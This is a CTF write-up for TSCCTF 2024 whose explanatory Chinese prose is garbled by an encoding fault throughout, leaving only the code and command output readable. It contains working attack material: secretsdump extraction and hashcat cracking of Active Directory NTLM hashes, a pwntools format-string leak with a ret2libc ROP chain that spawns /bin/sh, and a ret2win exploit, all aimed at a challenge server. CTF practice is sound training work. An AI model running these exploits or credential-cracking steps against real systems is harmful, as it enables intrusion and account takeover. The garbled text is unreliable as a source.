---
title: TSCCTF 2024
tags: [CTF, TSCCTF]

category: "Securityï½œCompetition"
---

# TSCCTF 2024
<!-- more -->
![image](https://hackmd.io/_uploads/BJLmu63Y6.png)

## Misc

### AKA

#### Source Code
:::spoiler IDA
```cpp=
__int64 flag_function()
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  num_of_files = 0;
  sub_14000A6C0();
  here_dll = LoadLibraryA("here.dll");
  flag_dll = LoadLibraryA("flag.dll");
  ghost_dll = LoadLibraryA("ghost.dll");
  strcpy(FileName, ".\\*.*");
  FirstFileA = FindFirstFileA(FileName, &FindFileData);
  while ( FindNextFileA(FirstFileA, &FindFileData) )
  {
    while ( *(_WORD *)FindFileData.cFileName != 46
         && (*(_WORD *)FindFileData.cFileName != 11822 || FindFileData.cFileName[2]) )
    {
      num_of_files += (GetFileAttributesA(FindFileData.cFileName) & 0x10) == 0;
      if ( !FindNextFileA(FirstFileA, &FindFileData) )
        goto LABEL_6;
    }
  }
LABEL_6:
  FindClose(FirstFileA);
  if ( num_of_files > 2 )
  {
    v6 = strcpy(buf, "We don't want too many files here.");
    puts(v6);
    v7 = strcpy(buf, "Files <= 2. You have ");
    v8 = (char *)sub_140071880(v7, (unsigned int)num_of_files);
    v9 = strcpy(v8, " file(s).");
    puts(v9);
    v10 = strcpy(buf, "Hint: Did you have short name?");
    puts(v10);
    return 0i64;
  }
  if ( !here_dll )
  {
    if ( !ghost_dll )
    {
      if ( !flag_dll )
      {
        v12 = strcpy(buf, "DLL load failed.");
        puts(v12);
        goto LABEL_12;
      }
      hint = (void (*)(void))GetProcAddress(flag_dll, "hint");
      if ( !hint )
        goto LABEL_12;
      goto LABEL_11;
    }
    goto LABEL_16;
  }
  if ( ghost_dll )
  {
LABEL_16:
    hint = (void (*)(void))GetProcAddress(ghost_dll, "Roflcopter");
    if ( !hint )
      goto LABEL_12;
    goto LABEL_11;
  }
  if ( !flag_dll )
  {
    hint = (void (*)(void))GetProcAddress(here_dll, "hint");
    if ( !hint )
    {
LABEL_12:
      FreeLibrary(here_dll);
      FreeLibrary(flag_dll);
      FreeLibrary(ghost_dll);
      return 0i64;
    }
LABEL_11:
    hint();
    goto LABEL_12;
  }
  flag = (void (*)(void))GetProcAddress(flag_dll, "flag");
  if ( flag )
    flag();
  return 0i64;
}
```
:::

#### Recon
é¡Œç›®çµ¦äº†vmdk fileï¼Œå…ˆç”¨Autopsyé–‹ï¼Œå¯ä»¥æ’ˆå‡º`ghost.dll`å’Œ`where_is_the_dll.exe`å…©å€‹æª”æ¡ˆ
![åœ–ç‰‡](https://hackmd.io/_uploads/ByGrGZuKp.png)

é€†å‘ä¸€ä¸‹æœƒç™¼ç¾é—œéµçš„codeå¦‚ä¸Šï¼Œæ¥è‘—å°±æ˜¯è€ƒé©—é€†å‘çš„åŠŸåŠ›ï¼Œå¯ä»¥ç¨å¾®å–µä¸€ä¸‹dllè£¡é¢exportå‡ºçš„æ±è¥¿æœ‰`flag`, `Roflcopter`å’Œ`hint`é€™ä¸‰å€‹function
![åœ–ç‰‡](https://hackmd.io/_uploads/SyicGbdYT.png)
ä¸éçœ‹PE fileä¸­æœ‰æåˆ°åŸ·è¡Œè³‡æ–™å¤¾ä¸­åªå…è¨±æœ‰å…©å€‹file
```cpp=24
  if ( num_of_files > 2 )
  {
    v6 = strcpy(buf, "We don't want too many files here.");
    puts(v6);
    v7 = strcpy(buf, "Files <= 2. You have ");
    v8 = (char *)sub_140071880(v7, (unsigned int)num_of_files);
    v9 = strcpy(v8, " file(s).");
    puts(v9);
    v10 = strcpy(buf, "Hint: Did you have short name?");
    puts(v10);
    return 0i64;
  }
```
ä¸¦ä¸”ä¸‹é¢æ¥çºŒä¸€äº›åˆ¤æ–·æœ‰ç„¡æŠŠdllæˆåŠŸloadé€²ä¾†çš„ä¸€äº›åˆ¤æ–·ï¼Œæ‰€ä»¥ä¸€é–‹å§‹çš„æƒ³æ³•æ˜¯ç›´æ¥patchï¼Œè®“ä»–å¯ä»¥ä¸éœ€è¦ç®¡æœ‰å¤šå°‘æª”æ¡ˆåœ¨åŒä¸€å€‹è³‡æ–™å¤¾ï¼Œå¦å¤–ä¸€ä»¶äº‹æƒ…æ˜¯æˆ‘å€‘çš„ç›®æ¨™æ‡‰è©²æœƒæ”¾åœ¨æœ€å¾Œå¹¾è¡Œ
```cpp=76
  flag = (void (*)(void))GetProcAddress(flag_dll, "flag");
  if ( flag )
    flag();
  return 0i64;
```
ä½†æ˜¯å¦‚æœç›´æ¥è®“ä»–è·³åˆ°é€™é‚Šï¼Œæœƒå› ç‚ºä¸€é–‹å§‹æ²’æœ‰loadé€²ç›¸å°æ‡‰çš„dllè€Œç™¼ç”Ÿsegmentation faultï¼Œæ­£ç¢ºçš„åšæ³•å¦‚ä¸‹

#### Exploit
é¦–å…ˆæŠŠ`ghost.dll`æ”¹æˆ`flag.dll`ï¼Œä¸¦ä¸”è¤‡è£½ä¸€ä»½å†renameæˆ`here.dll`
```bash
$ ll
total 4240
drwxrwxrwx 1 sbk6401 sbk6401    4096 Jan 19 20:11 .
drwxrwxrwx 1 sbk6401 sbk6401    4096 Jan 19 22:09 ..
-rwxrwxrwx 1 sbk6401 sbk6401      46 Jan 19 20:11 final_patch.1337
-rwxrwxrwx 1 sbk6401 sbk6401 1700882 Jan 19 18:32 flag.dll
-rwxrwxrwx 1 sbk6401 sbk6401 1700882 Jan 19 18:32 here.dll
-rwxrwxrwx 1 sbk6401 sbk6401  931328 Jan 19 18:32 where_is_the_dll.exe
```
ä»”ç´°çœ‹é€™æ¨£çš„é…ç½®å°±æœƒè®“codeç›´æ¥åŸ·è¡Œåˆ°æœ€å¾Œå¹¾è¡Œï¼Œä¸¦ä¸”å› ç‚ºæœ‰æˆåŠŸloadåˆ°`flag.dll`æ‰€ä»¥å¯ä»¥åŸ·è¡Œflag functionï¼Œåªæ˜¯éœ€è¦æŠŠåˆ¤æ–·folderä¸­æœ‰å¤šå°‘fileçš„åˆ¤æ–·patchæ‰
![åœ–ç‰‡](https://hackmd.io/_uploads/Bk8IBWdKa.png)

Flag: `TSC{nTF$_IS_w3ird}`

### RGB

#### Recon
é€™ä¸€é¡Œä¹Ÿæ˜¯ç®—æ–°ç“¶è£èˆŠé…’ï¼Œå¦‚æœæŠŠåœ–ç‰‡ä¸Ÿåˆ°stegsolveä¸¦æŒ‰ç…§RGBå„å–®ä¸€é¡è‰²å€åˆ†æœƒç™¼ç¾æœ‰ä¸‰å¼µä¸åŒçš„QRcodeï¼Œæ‹¿åˆ°[online tool](https://products.aspose.app/barcode/recognize/qr#)æƒæä¹‹å¾Œæœƒå‡ºç¾ä¸‰æ®µFLAGï¼ŒæŠŠä¸‰æ®µæ‹¼èµ·ä¾†å°±æ˜¯äº†

#### Exploit
```python
flag_1 = "T{5_e3V15r63o_O0_ErNnCV11M45RW7"
flag_2 = "SR34_D13_3L_k0_ma_3_D0444a1_3h3"
flag_3 = "C05Rr_07A_UY0Np5R934_n1r_j1A_1}"

real_flag = ""
for i in range(len(flag_1)):
    real_flag += flag_1[i]
    real_flag += flag_2[i]
    real_flag += flag_3[i]

print(real_flag)
```

Flag: `TSC{R0535_4Re_r3D_V101375_Ar3_6LU3_Yok0_0NO_p0m5_aRE_9r33N_4nD_C0nV4114r14_Maj4115_AR3_Wh173}`

### There is nothing here(1)

#### Recon
çœ‹ä¾†æˆ‘çš„é“è¡Œé‚„æ˜¯å¤ªæ·ºäº†ï¼Œæ„Ÿè¬@Salmon çµ¦çš„[æç¤º](https://blog.csdn.net/qq_45894840/article/details/128346180)ï¼Œæˆ‘ä¸€é–‹å§‹ç›´è¦ºä¹Ÿæ˜¯æ”¹å¯¬åº¦ï¼Œä½†æ˜¯ä¹‹å‰åªæœ‰å¯«ébmp / pngçš„é¡Œç›®ï¼Œä¸çŸ¥é“jpegæ€éº¼æ”¹ï¼Œæ‰€ä»¥å°±æ­ªæ¨“æƒ³åˆ°åˆ¥çš„åœ°æ–¹ï¼Œç¹ä¾†ç¹å»é‚„æ˜¯å›æ­¸åŸé»ï¼Œå› ç‚ºé¡Œç›®æœ‰æç¤ºé€™æ˜¯ä¸€å€‹square viewï¼Œæ‰€ä»¥æ‡‰è©²æ˜¯æŠŠåœ–ç‰‡çš„é•·å¯¬éƒ½æ”¹æˆ`04 00`ï¼Œå°±å¯ä»¥çœ‹åˆ°qrcodeäº†ï¼Œå†åˆ©ç”¨stegsolveæŠŠå…¶ä¸­ä¸€å€‹é¡è‰²çš„channel extractå‡ºä¾†ï¼Œä¸Ÿåˆ°[online scanner](https://products.aspose.app/barcode/recognize/qr#)å°±å¯ä»¥æ‹¿åˆ°flagäº†
![åœ–ç‰‡](https://hackmd.io/_uploads/SyNdMRuYp.png)

:::spoiler Flag QR Code
![](https://imgur.com/XbnbN5X.png)
:::

Flag: `TSC{Wh47_yoU_53e_IS_noT_Wh@t_YoU_9Et}`

### There is nothing here(2)

#### Recon
ç”±æ–¼ä¹‹å‰ç¬¬ä¸€é¡Œè§£ä¸å‡ºä¾†ï¼Œæ‰€ä»¥å…ˆå¯«é€™ä¸€é¡Œï¼Œé¡Œç›®æ•˜è¿°æœ‰æåˆ°è¦å…ˆæ‰¾å•é¡Œï¼Œä½†æˆ‘æ˜¯ç›´æ¥é–‹å§‹è§£XDDï¼Œç„¶å¾Œéä¸æœŸç„¶ä¸çŸ¥é“è¦å¯«å•¥ï¼Œé–‹ticketè©¢å•ä¸€ä¸‹é€™ä¸€é¡Œæ˜¯å¦å’Œå‰ä¸€é¡Œæœ‰é—œï¼Œå¾—åˆ°è‚¯å®šçš„å›è¦†å¾Œæ‰å›é ­è™•ç†ç¬¬ä¸€é¡Œï¼Œæµªè²»äº†ä¸€äº›æ™‚é–“

1. Modify JPG
    é¡Œç›®åªæœ‰çµ¦ä¸€å€‹vhdxçš„æª”æ¡ˆï¼Œæ‰€ä»¥æˆ‘å°±ç›´æ¥ä¸Ÿåˆ°FTKéš¨ä¾¿æœä¸€ä¸‹ï¼Œç™¼ç¾äº†ADçš„ä¸€äº›hive fileå’Œä¸€å¼µjpgåœ–ç‰‡ï¼Œä¸€æƒ³åˆ°å’Œå‰ä¸€é¡Œæœ‰é—œå°±æœæ–·æƒ³èªªè¦æ”¹é•·å¯¬ï¼Œæœä¸å…¶ç„¶ï¼Œç™¼ç¾äº†é¡Œç›®çœŸæ­£å•çš„å•é¡Œæ˜¯è¦è§£æ±ºADä¸­adminå¸³è™Ÿçš„å¯†ç¢¼çˆ†ç ´(åŸæœ¬æ˜¯`01 18 01 cc`)
    ![åœ–ç‰‡](https://hackmd.io/_uploads/S1aqnPFtp.png)
    
    ![card](https://hackmd.io/_uploads/Hy7kavKt6.jpg)
2. Hashcat in Kali
    æˆ‘æ˜¯åƒè€ƒ[ Password Cracking Using Hashcat and NTDS.dit | Cyber Security Tutorial ](https://youtu.be/-pOhdbJUD0g?si=omxs2h0V5Bcho5TU)é€™éƒ¨å½±ç‰‡çš„ä½œæ³•(é›–ç„¶ä¹‹å‰ç©ADçš„æ™‚å€™ä¹Ÿæœ‰å¯«éï¼Œä½†æˆ‘æ‡¶å¾—ç¿»ç­†è¨˜)ï¼Œé¦–å…ˆè¦å…ˆç”¨impacket/secretsdump.pyæŠŠ==ntds.dit==å’Œ==SYSTEM== hive fileçš„è³‡è¨Šå½™æ•´èµ·ä¾†
    ```bash
    $ ./secretsdump.py -ntds ./Active\ Directory/ntds.dit -system ./registry/SYSTEM LOCAL -outputfile ./myhashes.txt
    Impacket v0.11.0 - Copyright 2023 Fortra

    [*] Target system bootKey: 0xa8b93f7180a58e68855a3bc7b78a2fee
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Searching for pekList, be patient
    [*] PEK # 0 found and decrypted: e1464646eb31cceb90499786c54c1fea
    [*] Reading and decrypting hashes from ./Active Directory/ntds.dit 
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:674e48b68c5cd0efd8f7e5faa87b3d1e:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    WIN-D0GK9NN045J$:1000:aad3b435b51404eeaad3b435b51404ee:8992db8791f94857ffeaad27b67b8dc1:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6ec996e19cc73dffb3f966de98837ebe:::
    [*] Kerberos keys from ./Active Directory/ntds.dit 
    Administrator:aes256-cts-hmac-sha1-96:03a66dff72701640eaa7d8525cb9a93a22cd65dea5def40c0c55d6cce5a4c56d
    Administrator:aes128-cts-hmac-sha1-96:ebdf0b0b151ee52d372429ef1e4ac45d
    Administrator:des-cbc-md5:c19b6bf4d9d3b361
    WIN-D0GK9NN045J$:aes256-cts-hmac-sha1-96:cfb8bf03caea33ebfd870400b49b5d0f53a5675ace7866baed26d1ebb0da67f9
    WIN-D0GK9NN045J$:aes128-cts-hmac-sha1-96:8069ceb2edc5ac4f76a8c595f2a09ee3
    WIN-D0GK9NN045J$:des-cbc-md5:3d3de59e9162ea6b
    krbtgt:aes256-cts-hmac-sha1-96:534850fe38ca92f7a687fc98d8282fbabb717a2803032e11f2b4b5d05f226545
    krbtgt:aes128-cts-hmac-sha1-96:835a3f9fd0a75f82d4ebed41441b01db
    krbtgt:des-cbc-md5:86290bba68d58c23
    [*] Cleaning up...
    $ cat myhashes.txt.ntds
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:674e48b68c5cd0efd8f7e5faa87b3d1e:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    WIN-D0GK9NN045J$:1000:aad3b435b51404eeaad3b435b51404ee:8992db8791f94857ffeaad27b67b8dc1:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6ec996e19cc73dffb3f966de98837ebe:::
    ```
    æ¥è‘—æ‰æ˜¯ç”¨hashcatå»çˆ†ç ´ï¼Œè€Œä½œè€…ä¹Ÿå¾ˆå¥½å¿ƒçš„æŠŠwordlistéƒ½æ•´ç†å¥½äº†
    ```bash
    $ hashcat -m 1000 ./myhashes.txt.ntds ./fasttrack.txt
    $ hashcat -m 1000 ./myhashes.txt.ntds ./fasttrack.txt --show --username
    Administrator:674e48b68c5cd0efd8f7e5faa87b3d1e:welcome
    Guest:31d6cfe0d16ae931b73c59d7e0c089c0:
    DefaultAccount:31d6cfe0d16ae931b73c59d7e0c089c0:
    ```
    ç¾åœ¨æˆ‘å€‘çŸ¥é“ä¸€éƒ¨åˆ†çš„flagï¼Œä¹Ÿå°±æ˜¯Adminçš„å¯†ç¢¼ç‚ºwelcomeï¼Œé›–ç„¶ç›´æ¥åœ¨ç¶²è·¯ä¸Šçš„ä¸€äº›NTLM dbæœå°‹ä¹Ÿå¯ä»¥æ‰¾çš„åˆ°é€™ä¸€çµ„ç¶“å…¸çš„å¯†ç¢¼ï¼Œä¸éå°±é‚„æ˜¯ç·´ç¿’ä¸€ä¸‹æ­£è¦çš„æ“ä½œ

3. Domain in SYSTEM hive
    å¦ä¸€å€‹flagä¹Ÿå°±æ˜¯ADçš„FQDNï¼Œå¯ä»¥å¾SYSTEM hiveä¸­çš„`SYSTEM/ControlSet001/Service/Tcpip/Parameters`ä¸­æ‰¾åˆ°
    ![åœ–ç‰‡](https://hackmd.io/_uploads/rkvM1dKKT.png)
    è€Œç†è«–ä¸Šä¾†èªªFQDNæ‡‰è©²æ˜¯[hostname].[domain]å…©å€‹ä¸²åœ¨ä¸€èµ·æ‰æ˜¯unique FQDNï¼Œä½†ä½œè€…èªªå…¶å¯¦åªéœ€è¦domainå°±å¥½ï¼Œæ‰€ä»¥æœ€å¾Œçš„flagæœƒæ˜¯`TSC{tsc_ctf_AD.local_welcome}`
    
Flag: `TSC{tsc_ctf_AD.local_welcome}`

### TL;DL

#### Hint
* Hint 1
    > len(flag) > 20
* Hint 2
    > How many channels does the audio file have?
* Hint 3
    > Cogito, ergo sum
* Hint 4
    > Are you familiar with the tool used to display signal voltages?
* Hint 5
    > ![BkfafXhYa](https://hackmd.io/_uploads/rkOqByWja.png)

#### Recon
é€™ä¸€é¡ŒçœŸçš„å¤ªé›£äº†ï¼Œä¸éä¹Ÿæ˜¯æœ‰ä¸€é»æœ‰è¶£ï¼ŒHintä¹Ÿæ˜¯çµ¦äº†è¶…å¤šä½†é‚„æ˜¯åªæœ‰ä¸€å€‹äººè§£å‡ºä¾†ï¼Œ@ywcçœŸçš„å¤ªé¬¼äº†é€™ä¸€é¡Œä¹Ÿæ˜¯è³½å¾Œè§£
å¾é¡Œç›®çµ¦çš„hintå¯ä»¥çŸ¥é“1. ç¬›å¡çˆ¾, 2. ç›´è§’åæ¨™, 3. éŸ³é »æŒ¯å¹…
æ­¤æ™‚é‡å°é€™ç¨®è…¦å‹•å°±è¦è¶Šé–‹è¶Šå¥½ï¼Œå¦‚æœæŠŠæŒ¯å¹…ç•«å‡ºä¾†æœƒæ€éº¼æ¨£å‘¢?å…¶å¯¦å°±æ˜¯é€™éº¼ç°¡å–®ï¼Œä½†ç¶œè§€ç¶²è·¯ä¸Šçš„è³‡æºæˆ–æ˜¯ä¹‹å‰æ‰“éçš„é¡Œç›®éƒ½æ²’æœ‰é€™æ¨£é¡ä¼¼çš„é¡Œç›®ï¼Œæ‰€ä»¥è‡ªå·±å¯«å€‹scriptå¦‚ä¸‹ï¼Œå˜—è©¦æŠŠåœ–æ¡ˆç•«å‡ºä¾†ã€‚

:::info
é †å¸¶ä¸€æï¼Œçœ‹äº†@ywcå¤§ç¥çš„WPå¾Œæ‰çŸ¥é“å…¶å¯¦æ²’æœ‰é‚£éº¼é€šéˆï¼Œå› ç‚ºä¸€é–‹å§‹importé€²å»Audacityå¾Œé›–ç„¶çœ‹ä¼¼å•¥éƒ½æ²’æœ‰ï¼Œæˆ‘ä¹ŸæŒ‰ç…§ä¹‹å‰çš„ç¶“é©—ç”¨é »è­œå»çœ‹ï¼Œä½†æ˜¯ä¾ç„¶åªæœ‰çœ‹ä¼¼æ˜¯æ‘©æ–¯å¯†ç¢¼çš„æ±è¥¿ï¼Œæ­¤æ™‚åªè¦æ¡ç”¨æ­£è¦åŠƒå°±å¯ä»¥çœ‹å‡ºä¸€äº›äº›ç«¯å€ªäº†
![åœ–ç‰‡](https://hackmd.io/_uploads/ByKFrZWjT.png)

![åœ–ç‰‡](https://hackmd.io/_uploads/ry8cr-ZoT.png)
:::

#### Exploit
é †å¸¶ä¸€é¡Œï¼Œè®€å–é€™ä¸€é¡Œçš„éŸ³æª”ä¸èƒ½ç”¨waveé€™å€‹libraryï¼Œå› ç‚ºé€™ä¸€é¡Œçš„éŸ³æª”ä¸æ˜¯ä¸€å€‹æ¨™æº–çš„PCMç·¨ç¢¼çš„.wavæª”æ¡ˆã€‚wave libraryåªæ”¯æ´PCMç·¨ç¢¼çš„.wavæª”æ¡ˆã€‚
```python=
from scipy.io import wavfile
import matplotlib.pyplot as plt

sample_rate, data = wavfile.read('./TSCCTF 2024/Misc/TL;DL/flag-tldl.wav')

left_channel = data[:, 0]
right_channel = data[:, 1]

plt.figure()
plt.plot(left_channel, right_channel)

# Add labels
plt.xlabel('x')
plt.ylabel('y')
plt.title('A simple plot')

plt.show()
```
![flag](https://hackmd.io/_uploads/Sk1t4JZjT.png)

Flag: `TSC{V3ry_10Ud_d1R3c7_CUrR3N7_Bu7_1n_32-b17_f1047}`

## Reverse

### sHELLcode

#### Source Code
:::spoiler IDA main function
```cpp=
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  const char *v5; // ebx
  int v6; // eax
  int v7; // eax
  unsigned int i; // [esp+1Ch] [ebp-8h]

  __main();
  if ( argc == 1 )
  {
    v3 = std::operator<<<std::char_traits<char>>(&std::cout, "./sHELLcode.exe <Flag>");
    std::operator<<<std::char_traits<char>>(v3, 10);
    return 0;
  }
  else if ( strlen(argv[1]) == 33 )
  {
    for ( i = 0; i <= 0x84; ++i )
      code[i] ^= 0x87u;
    if ( (*(int (__cdecl **)(const char *))code)(argv[1]) )
    {
      v5 = argv[1];
      v6 = std::operator<<<std::char_traits<char>>(&std::cout, "Here is your flag: ");
      v7 = std::operator<<<std::char_traits<char>>(v6, v5);
      std::operator<<<std::char_traits<char>>(v7, 10);
    }
    return 0;
  }
  else
  {
    return 0;
  }
}
```
:::

#### Recon
é€™å€‹ä¹Ÿæ˜¯æœ‰é»æœ‰è¶£ï¼Œä¹Ÿæ˜¯ç®—æ°´é¡Œï¼Œä½†æ„ç¾©æ·±é ï¼Œå¯ä»¥çœ‹åˆ°åŸæœ¬çš„codeä¸­æœ‰ä¸€å€‹function pointerï¼Œåœ¨é–‹å§‹check flagä¹‹å‰åšäº†decryptï¼Œæ‰€ä»¥ä¸€é–‹å§‹çš„ç¢ºä¸çŸ¥é“åŸæœ¬åœ¨åšç”šéº¼ï¼Œä½†åªè¦ä½¿ç”¨å·¥äººæ™ºæ…§æŠŠé€™ä¸€æ®µpatchæ‰ï¼Œå†ç”¨IDAé‡æ–°å¹«å¿™åçµ„è­¯ï¼Œå°±å¯ä»¥å¯«scriptäº†
```python
enc_code = [  0xD2, 0x0E, 0x62, 0xD4, 0x04, 0x6B, 0x93, 0x0A, 0xC2, 0x74, 0x40, 0x87, 0xE4, 0xBF, 0xB0, 0xB1, 0xE1, 0x40, 0xC7, 0x83, 0xB4, 0x87, 0x40, 0xC2, 0x7F, 0x87, 0x87, 0x87, 0x87, 0x04, 0xFA, 0x7F, 0xA7, 0xF8, 0xD1, 0x0C, 0xC2, 0x7F, 0x0C, 0x9B, 0x02, 0xE7, 0xC6, 0xC7, 0x87, 0x0C, 0xD2, 0x7F, 0x0C, 0xC2, 0x8F, 0x86, 0x57, 0x88, 0x31, 0x87, 0x0F, 0xC2, 0x6C, 0x0C, 0xCA, 0x7F, 0x3D, 0xE0, 0xE1, 0xE1, 0xE1, 0x0E, 0x4F, 0x70, 0x6D, 0x56, 0x7D, 0x0E, 0x4F, 0x46, 0x7F, 0x98, 0xAE, 0x45, 0x0E, 0x57, 0x0E, 0x45, 0x46, 0x65, 0x85, 0x86, 0x45, 0x0E, 0x4F, 0xAE, 0x57, 0x88, 0x31, 0xC3, 0x82, 0x74, 0xB5, 0xC2, 0x6C, 0x88, 0x39, 0x47, 0xBE, 0x44, 0xF3, 0x80, 0x3F, 0x87, 0x87, 0x87, 0x87, 0x6C, 0x8C, 0x04, 0xC2, 0x7F, 0x86, 0x6C, 0x23, 0x3F, 0x86, 0x87, 0x87, 0x87, 0x04, 0x43, 0x93, 0xDC, 0xDA, 0x44, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]

real_code = []
for i in range(0x84):
    real_code.append("{:02x}".format(enc_code[i] ^ 0x87))
print(" ".join(real_code))
# 55 89 e5 53 83 ec 14 8d 45 f3 c7 00 63 38 37 36 66 c7 40 04 33 00 c7 45 f8 00 00 00 00 83 7d f8 20 7f 56 8b 45 f8 8b 1c 85 60 41 40 00 8b 55 f8 8b 45 08 01 d0 0f b6 00 88 45 eb 8b 4d f8 ba 67 66 66 66 89 c8 f7 ea d1 fa 89 c8 c1 f8 1f 29 c2 89 d0 89 c2 c1 e2 02 01 c2 89 c8 29 d0 0f b6 44 05 f3 32 45 eb 0f be c0 39 c3 74 07 b8 00 00 00 00 eb 0b 83 45 f8 01 eb a4 b8 01 00 00 00 83 c4 14 5b 5d c3
```
æŠŠåŸæœ¬encrypted codeçš„åœ°æ–¹æ”¹æ‰ï¼Œå†é‡æ–°disassembleä¸€ä¸‹ï¼Œæ›´æ–°å¦‚ä¸‹:
```cpp
int __cdecl code(int flag)
{
  _BYTE v2[9]; // [esp+Bh] [ebp-Dh] BYREF

  strcpy(v2, "c8763");
  v2[6] = 0;
  *(_WORD *)&v2[7] = 0;
  while ( *(int *)&v2[5] <= 32 )
  {
    if ( check_string[*(_DWORD *)&v2[5]] != (char)(*(_BYTE *)(*(_DWORD *)&v2[5] + flag) ^ v2[*(_DWORD *)&v2[5] % 5]) )
      return 0;
    ++*(_DWORD *)&v2[5];
  }
  return 1;
}
```

#### Exploit
```python
enc_flag = [0x37, 0x7B, 0x7B, 0x75, 0x67, 0x25, 0x43, 0x79, 0x59, 0x44, 0x3C, 0x4D, 0x45, 0x69, 0x72, 0x3C, 0x4B, 0x7F, 0x73, 0x7F, 0x2F, 0x5B, 0x58, 0x52, 0x56, 0x3C, 0x75, 0x03, 0x45, 0x67, 0x06, 0x4A, 0x4A]

key = [51, 54, 55, 56, 99]
key = [0x63, 0x38, 0x37, 0x36, 0x33]
flag = ""
for i in range(33):
    flag += chr(enc_flag[i] ^ key[i % 5])

print(flag)
```

Flag: `TCLCTF{Now_ur_A_sHELLcode_M4sTer}`

## PWN

### ret2libc

#### Source Code
```cpp=
#include <stdio.h>
#include <stdio.h>

int main(){
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	puts("Do you know the libc?");
	char str[0x20];
	scanf("%s", str);
	getchar();
	printf(str);
	gets(str);
	return 0;
}
```

#### Recon
é€™ä¸€é¡Œçš„ç’°å¢ƒå¾ˆæï¼Œæˆ‘è¦ºå¾—ä»¥åªæœ‰ä¸Šéç¤¾åœ˜çš„æ–°æ‰‹ä¾†èªªæ‡‰è©²å¾ˆé›£ï¼Œç•¢ç«Ÿéƒ½æ˜¯åŸºæœ¬åŠŸï¼Œä½†èªªå¯¦è©±ï¼Œç”¨åˆ°format bug stringçš„å¯¦ç”¨åº¦çœŸçš„ä¸é«˜
1. å¾source codeä¸­å¯ä»¥ç™¼ç¾ç°¡å–®çš„format bugå’Œbofçš„å•é¡Œï¼Œæ‰€ä»¥å¤§è†½çŒœæ¸¬å…ˆleak stack infoï¼Œç„¶å¾Œæ‹¿åˆ°libc base
2. æ¥è‘—ç”¨åˆ°å¾Œé¢çš„getsé”åˆ°bof + ropï¼Œç„¶å¾Œä»–æœ‰é–‹canaryï¼Œæ‰€ä»¥è¨˜å¾—canaryä¹Ÿè¦æ”¾å°

#### Exploit - FBS + ret2libc + BoF + ROP
:::success
åˆ°é€™é‚Šæ‡‰è©²å¾ˆç°¡å–®ï¼Œlocalä¹Ÿæ˜¯ä¸€ä¸‹å­å°±éäº†ï¼Œä½†ä¸çŸ¥é“ç‚ºç”šéº¼ï¼Œæˆ‘ç™¼ç¾é¡Œç›®çµ¦çš„libc.so.6å’Œserverç«¯çš„ä¸ä¸€æ¨£ï¼Œä¸€ç›´debugéƒ½æ²’æœ‰ç”šéº¼å¥½çµæœï¼Œå¾Œä¾†é‚„æ˜¯ä¹¾è„†é–‹dockeråœ¨localç«¯è·‘ä¸€ä¸‹ç’°å¢ƒï¼Œçµæœç«Ÿç„¶ç™¼ç¾ROPçš„gadgetçœŸçš„å°ä¸åˆ°ï¼Œæ‡‰è©²èªªåªæœ‰`pop rdx ; pop rbx ; ret`é€™å€‹gadgetç™¼ç”Ÿå•é¡Œï¼Œæ‰€ä»¥æˆ‘ä¹Ÿæ˜¯ç›´æ¥copyå‡ºdockerçš„libcæ‰éçš„ï¼ŒçœŸçš„æ˜¯å‚»çœ¼...
:::
```python
from pwn import *

# r = process('./ret2libc', env={"LD_PRELOAD" : "./libc.so.6"})
r = remote('172.31.210.1', 50002)

print(r.recvline())
payload = b'%p' * 14 + b'^'
r.sendline(payload)
stack_info = r.recvuntil(b'^')[:-1].replace(b'(nil)', b'0xdeadbeef').split(b'0x')
canary = int(stack_info[-4], 16)


libc_main = int(stack_info[-2], 16)
libc_base = libc_main - 0x24083# 0x29d90

log.info(f'{stack_info}')
log.info(f'{hex(libc_main)}')
log.info(f'{hex(libc_base)}')
log.info(f'{hex(canary)}')

pop_rax_ret = libc_base + 0x0000000000036174# 0x0000000000045eb0# : pop rax ; ret
pop_rdi_ret = libc_base + 0x0000000000023b6a# 0x000000000002a3e5# : pop rdi ; ret
pop_rsi_ret = libc_base + 0x000000000002601f# 0x000000000002be51# : pop rsi ; ret
pop_rdx_rbx_ret = libc_base + 0x0000000000015fae6# 0x00000000000904a9# : pop rdx ; pop rbx ; ret
bin_sh = libc_base + 0x00000000001b45bd# 0x00000000001d8678# : /bin/sh
syscall_ret = libc_base + 0x000000000002284d# 0x0000000000091316# : 


r.sendline(b'a' * 0x28 + p64(canary) + p64(1) + p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(bin_sh) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_rbx_ret) + p64(0) + p64(0) + p64(syscall_ret))

r.interactive()
```

### ret2win

#### Exploit - å°±æ˜¯ç°¡å–®åˆ°ä¸èƒ½å†ç°¡å–®çš„ret2win
```python
from pwn import *

r = remote('172.31.210.1', 50001)
# r = process('./ret2win')

r.recvline()

fn_win_addr = 0x000000000401196
r.sendline(b'a' * 0x28 + p64(fn_win_addr))
r.interactive()
```

## Web

### [æ•™å­¸é¡Œ] æ¥µä¹‹ç•ªã€æ¼©æ¸¦ã€

#### Recon
é€™ä¸€é¡Œæœ‰å››å°é¡Œï¼Œéƒ½æ˜¯å’ŒPHPç›¸é—œçš„æ´ï¼Œæ‡‰è©²æ˜¯å€‹å°æ–°æ‰‹éƒ½å¾ˆæœ‰æ„Ÿè¦ºçš„é¡Œç›®
